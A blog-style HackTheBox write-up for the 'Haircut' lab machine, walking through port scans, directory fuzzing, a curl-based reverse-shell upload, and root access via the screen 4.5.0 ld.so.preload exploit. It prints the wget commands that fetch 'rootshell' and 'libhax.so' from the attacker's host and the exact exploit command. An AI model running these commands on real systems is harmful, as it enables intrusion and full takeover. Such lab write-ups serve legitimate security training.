---
image: /assets/img/haircut/haircut.png
layout: post
title: Haircut
date: 2020-10-19 00:00:01 +5:30
categories: [Hackthebox, Medium]
tags: [cve, screen, curl] # add tag
---

## Summary

>Portscan results in 22 and 80 Open<br />
>Now Dirbusting Port 80 with dir list med and php extension will give a page<br />
>The php page have curl running so Transfer reverse Shell & get www-data
>Checking into setuid. There is screen with version 4.5<br />
>Exploitdb have some exploits for local privesc.

## Walkthrough

### Enumration

```terminal
argenestel@parrot  ~/Desktop/hackthebox/haircut  rustscan  10.10.10.24
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
--------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/argenestel/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.10.24:22
Open 10.10.10.24:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.10.24

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 07:23 IST
Initiating Ping Scan at 07:23
Scanning 10.10.10.24 [2 ports]
Completed Ping Scan at 07:23, 0.20s elapsed (1 total hosts)
Initiating Connect Scan at 07:23
Scanning haircut.htb (10.10.10.24) [2 ports]
Discovered open port 80/tcp on 10.10.10.24
Discovered open port 22/tcp on 10.10.10.24
Completed Connect Scan at 07:23, 0.25s elapsed (2 total ports)
Nmap scan report for haircut.htb (10.10.10.24)
Host is up, received syn-ack (0.21s latency).
Scanned at 2020-10-19 07:23:22 IST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

So we have port 80 and 22 let's run script.

```terminal
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo4pezhJs9c3u8vPWIL9eW4qxQOrHCslAdMftg/p1HDLCKc+9otg+MmQMlxF7jzEu8vJ0GPfg5ONRxlsfx1mwmAXmKLh9GK4WD2pFbg4iFiAO/BAUjs3dNdR1S9wR6F+yRc2jgIyKFJO3JohZZFnM6BrTkZO7+IkSF6b3z2qzaWorHZW04XHdbxKjVCHpU5ewWQ5B32ScKRJE8bsi04Z2lE5vk1NWK15gOqmuyEBK8fcQpD1zCI6bPc5qZlwrRv4r4krCb1h8zYtAwVnoZdtYVopfACgWHxqe+/8YqS8qo4nPfEXq8LkUc2VWmFztWMCBuwVFvW8Pf34VDD4dEiIwz
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrPH0YEefX9y/Kyg9prbVSPe3U7fH06/909UK8mAIm3eb6PWCCwXYC7xZcow1ILYvxF1GTaXYTHeDF6VqX0dzc=
|   256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+vUE7P+f2aiWmwJRuLE2qsDHrzJUzJLleMvKmIHoKM
80/tcp open  http    syn-ack nginx 1.10.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### port80

![port80](/assets/img/haircut/port80.png)
```terminal
argenestel@parrot  ~/Desktop/hackthebox/haircut  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://haircut.htb/FUZZ.php

       /'___\  /'___\           /'___\       
      /\ \__/ /\ \__/  __  __  /\ \__/       
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
         \/_/    \/_/   \/___/    \/_/       

      v1.0.2
________________________________________________

:: Method           : GET
:: URL              : http://haircut.htb/FUZZ.php
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

#                       [Status: 200, Size: 144, Words: 11, Lines: 8]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 144, Words: 11, Lines: 8]
# Copyright 2007 James Fisher [Status: 200, Size: 144, Words: 11, Lines: 8]
#                       [Status: 200, Size: 144, Words: 11, Lines: 8]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 144, Words: 11, Lines: 8]
# on atleast 2 different hosts [Status: 200, Size: 144, Words: 11, Lines: 8]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 144, Words: 11, Lines: 8]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 144, Words: 11, Lines: 8]
#                       [Status: 200, Size: 144, Words: 11, Lines: 8]
# directory-list-2.3-medium.txt [Status: 200, Size: 144, Words: 11, Lines: 8]
#                       [Status: 200, Size: 144, Words: 11, Lines: 8]
# This work is licensed under the Creative Commons  [Status: 200, Size: 144, Words: 11, Lines: 8]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 144, Words: 11, Lines: 8]
```

Alright so we have curl command running in this page.<br />
Judging from page it maybe something like system('curl $formlink') and it have char filtering we can't use ;.<br />
But we can still use curl options

Set Http server in local machine and Transfer reverse shell.

![reverse](/assets/img/haircut/revshell.png)
![pwncat](/assets/img/haircut/pwncat.png)


### PrivEsc

```terminal
www-data@haircut:/tmp$ find / -perm /4000 2>/dev/null
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0

```

So screen turns out to be odd and have 4.5.0 version upon  checking it have local linux priv esc
https://www.exploit-db.com/exploits/41154

```terminal
Saving to: 'rootshell'

rootshell                         100%[==========================================================>]  16.42K  33.2KB/s    in 0.5s    

2020-10-19 07:26:13 (33.2 KB/s) - 'rootshell' saved [16816/16816]

www-data@haircut:/tmp$ wget 10.10.14.18:8000/libhax.so
--2020-10-19 07:26:21--  http://10.10.14.18:8000/libhax.so
Connecting to 10.10.14.18:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16136 (16K) [application/octet-stream]
Saving to: 'libhax.so'

libhax.so                         100%[==========================================================>]  15.76K  38.5KB/s    in 0.4s    

2020-10-19 07:26:22 (38.5 KB/s) - 'libhax.so' saved [16136/16136]

www-data@haircut:/tmp$ cd /etc
www-data@haircut:/etc$ umask 000 # because
www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
www-data@haircut:/etc$ screen -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@haircut:/etc$ /tmp/rootshell
\u@\h:\w$ id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
\u@\h:\w$ bash
root@haircut:/etc#
```
